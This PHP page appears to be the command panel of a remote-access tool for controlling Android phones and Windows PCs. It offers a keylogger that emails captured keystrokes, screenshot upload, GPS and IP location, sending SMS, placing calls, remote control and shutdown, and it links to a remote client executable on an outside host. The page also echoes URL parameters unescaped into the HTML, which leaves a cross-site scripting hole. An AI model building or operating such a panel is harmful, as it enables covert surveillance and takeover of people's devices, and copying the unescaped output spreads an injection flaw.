<?php include 'header.php';  ?>



<h1>Add CMD for device: <?php echo $_GET["id"]; ?></h1>

<form role="form" action="addcmdtodb.php" method="post">

 <div class="form-group" width="30">

    <label for="user">user:</label>

    <input type="user" class="form-control" id="user" name="user" value="websitePanel" disabled>

  </div>

  <div class="form-group" width="30">

    <label for="user">device ID:</label>

    <input type="user" class="form-control" id="user" name="id" value="<?php echo $_GET["id"]; ?>">

  </div>

  <div class="form-group" width="30">

    <label for="user">Type:<?php echo $_GET["type"]; ?></label>

    

  </div>

  <div class="form-group">

     

    

  <?php

  if($_GET["type"]=="Android")

  {

	  echo '<div class="form-group">

      <label for="sel1">Select command:</label>

      <select class="form-control" id="sel1" name="t1">

        <option value="101">ToastMessage</option>

        <option value="102">Notification</option>

        <option value="103">GetLocation</option>

		<option value="104">CallNumber</option>

		<option value="105">SendSMS</option>

		<option value="106">OpenUrl</option>

      </select>

    </div>';

  }else if($_GET["type"]=="PC")

  {

	  echo'<div class="form-group">

      <label for="sel1">Select command:</label>

      <select class="form-control" id="sel1" name="t1">

        <option value="201">MessageBox</option>

        <option value="231">OpenCD</option>

        <option value="211">Screenshot</option>

		<option value="212">Current window</option>

		<option value="213">Keylogger</option>

		<option value="232">ShutDown</option>

		<option value="233">Restart</option>

		<option value="234">LogOff</option>
<option value="219">GetIpLocation</option>
<option value="376">Start Remote Control</option>
<option value="377">Stop Remote Control</option>


      </select>

    </div>';

  }

  ?>

<label for="usr">Message:</label>

  <input type="text" class="form-control" id="msg" name="t2">

  

  

  </div>

  <button type="submit" class="btn btn-default">AddCommand</button>

</form>



<?php



if($_GET["type"] == "Android")

		{

			echo '<h3>Comenzi Android</h3>

<p>101[msg]-toast </p>

<p>102[msg] - notif</p>

<p>103 - get gps</p>

<p>104[number] - call number</p>

<p>105[number];[msg] - sendsms</p>

<p>106[link] - openurl</p>';

		}

		else

		{

						echo '<h3>Comenzi PC</h3>

<p>201[msg]- messagebox</p>

<p>231 - open cd</p>

<p>211 - take ss and upload it</p>

<p>212 - current window</p>

<p>213[mail] - Keylogger send datas</p>

<p>232 - shutdown</p>

<p>233 - restart</p>

<p>234 - logoff</p>

<p>219 - locationIP</p>
<p>376 - start remote</p>
<p>377 - stop remote</p>

<p>Download remote exe  <a href="http://zamolxis.org/dev/kotys/RemoteClient.exe">here</a></p>';

		}



?>